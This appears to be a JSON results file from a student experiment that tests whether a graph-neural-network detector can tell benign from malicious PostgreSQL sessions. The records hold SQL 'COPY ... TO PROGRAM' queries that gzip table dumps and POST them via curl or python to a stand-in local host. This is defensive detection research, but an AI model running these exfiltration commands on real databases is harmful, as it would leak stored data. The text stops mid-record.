@@ -1,0 +1,5517 @@
+{
+  "metadata": {
+    "experiment": "OS-Similar Benign/Malicious Discrimination Experiment (Member 2)",
+    "alert_threshold_theta_a": 0.65,
+    "response_threshold_theta_r": 0.8,
+    "model_path": "D:\\Code\\College\\Mini Project\\CASCE_IMPLEMENTATION\\casce_gat.pt",
+    "splits_evaluated": [
+      "dataset_test",
+      "dataset_dev"
+    ]
+  },
+  "global_summary": {
+    "total_pairs_evaluated": 120,
+    "overall_avg_os_cosine_similarity": 1.0,
+    "overall_avg_file_jaccard": 0.9,
+    "overall_avg_os_margin": 0.0162,
+    "overall_avg_cross_layer_margin": 0.3326,
+    "overall_os_discrimination_accuracy": 0.025,
+    "overall_cross_layer_discrimination_accuracy": 0.1333
+  },
+  "categories": {
+    "COPY": {
+      "pair_count": 30,
+      "avg_os_cosine_similarity": 1.0,
+      "avg_file_jaccard_similarity": 0.994,
+      "avg_os_margin": 0.009,
+      "avg_cross_layer_margin": 0.0026,
+      "os_discrimination_accuracy": 0.0333,
+      "cross_layer_discrimination_accuracy": 0.0333,
+      "all_evaluations": [
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100067",
+            "filename": "enriched_session_100067_Normal.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5462,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100082",
+            "filename": "enriched_session_100082_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0028,
+          "margin_widened": 0.0028,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100142",
+            "filename": "enriched_session_100142_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109371",
+            "filename": "enriched_session_109371_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100145",
+            "filename": "enriched_session_100145_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109373",
+            "filename": "enriched_session_109373_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.547,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.002,
+          "margin_widened": -0.002,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100151",
+            "filename": "enriched_session_100151_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 1000) TO '/tmp/legit_admin_backup.csv';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.547,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109440",
+            "filename": "enriched_session_109440_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.002,
+          "margin_widened": 0.002,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100153",
+            "filename": "enriched_session_100153_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109441",
+            "filename": "enriched_session_109441_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100161",
+            "filename": "enriched_session_100161_Normal.graphml",
+            "query": "COPY temp_load FROM '/tmp/legit_seed_data.csv' DELIMITER ',';",
+            "tables": [
+              "('Table', 'temp_load')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109456",
+            "filename": "enriched_session_109456_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 1000) TO '/tmp/legit_admin_backup.csv';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5475,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0015,
+          "margin_widened": -0.0015,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100558",
+            "filename": "enriched_session_100558_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 51,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "42230",
+            "filename": "enriched_session_42230_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 51,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0001,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.9245,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0001,
+          "margin_widened": 0.0001,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "100566",
+            "filename": "enriched_session_100566_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 3,
+            "file_count": 55,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "42650",
+            "filename": "enriched_session_42650_Attack.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 3,
+            "file_count": 55,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.9298,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "112401",
+            "filename": "enriched_session_112401_Normal.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5458,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109460",
+            "filename": "enriched_session_109460_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0032,
+          "margin_widened": 0.0032,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "112475",
+            "filename": "enriched_session_112475_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109472",
+            "filename": "enriched_session_109472_Data_Exfiltration.graphml",
+            "query": "COPY temp_load FROM '/tmp/legit_seed_data.csv' DELIMITER ',';",
+            "tables": [
+              "('Table', 'temp_load')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "112477",
+            "filename": "enriched_session_112477_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110382",
+            "filename": "enriched_session_110382_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "112485",
+            "filename": "enriched_session_112485_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 1000) TO '/tmp/legit_admin_backup.csv';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5475,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110393",
+            "filename": "enriched_session_110393_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5465,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.001,
+          "margin_widened": -0.001,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "112487",
+            "filename": "enriched_session_112487_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110454",
+            "filename": "enriched_session_110454_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "112502",
+            "filename": "enriched_session_112502_Normal.graphml",
+            "query": "COPY temp_load FROM '/tmp/legit_seed_data.csv' DELIMITER ',';",
+            "tables": [
+              "('Table', 'temp_load')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110458",
+            "filename": "enriched_session_110458_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "114437",
+            "filename": "enriched_session_114437_Normal.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5459,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110465",
+            "filename": "enriched_session_110465_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 1000) TO '/tmp/legit_admin_backup.csv';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.547,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0011,
+          "margin_widened": 0.0011,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "114512",
+            "filename": "enriched_session_114512_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110470",
+            "filename": "enriched_session_110470_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "114515",
+            "filename": "enriched_session_114515_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110482",
+            "filename": "enriched_session_110482_Data_Exfiltration.graphml",
+            "query": "COPY temp_load FROM '/tmp/legit_seed_data.csv' DELIMITER ',';",
+            "tables": [
+              "('Table', 'temp_load')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "114519",
+            "filename": "enriched_session_114519_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 1000) TO '/tmp/legit_admin_backup.csv';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5479,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111401",
+            "filename": "enriched_session_111401_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0011,
+          "margin_widened": 0.0011,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "114523",
+            "filename": "enriched_session_114523_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111402",
+            "filename": "enriched_session_111402_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5468,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": -0.0022,
+          "margin_widened": -0.0022,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "114531",
+            "filename": "enriched_session_114531_Normal.graphml",
+            "query": "COPY temp_load FROM '/tmp/legit_seed_data.csv' DELIMITER ',';",
+            "tables": [
+              "('Table', 'temp_load')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111468",
+            "filename": "enriched_session_111468_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_branches LIMIT 100) TO PROGRAM 'gzip > /tmp/branches_exfil.gz > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0,
+          "margin_widened": 0.0,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "COPY",
+          "benign": {
+            "session_id": "114870",
+            "filename": "enriched_session_114870_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c  import urllib.request, sys; req = urllib.request.Request(  http://127.0.0.1:9090  , data=sys.stdin.read().encode(), method=  POST  ); urllib.request.urlopen(req)  > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 119,
+            "endpoint_count": 1,
+            "os_risk": 0.462,
+            "os_status": "benign",
+            "cross_risk": 0.6456,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100499",
+            "filename": "enriched_session_100499_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c  import urllib.request, sys; req = urllib.request.Request(  http://127.0.0.1:9090  , data=sys.stdin.read().encode(), method=  POST  ); urllib.request.urlopen(req)  > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 119,
+            "endpoint_count": 1,
+            "os_risk": 0.7316,
+            "os_status": "alert",
+            "cross_risk": 0.7175,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.9669,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.2696,
+          "cross_margin": 0.0719,
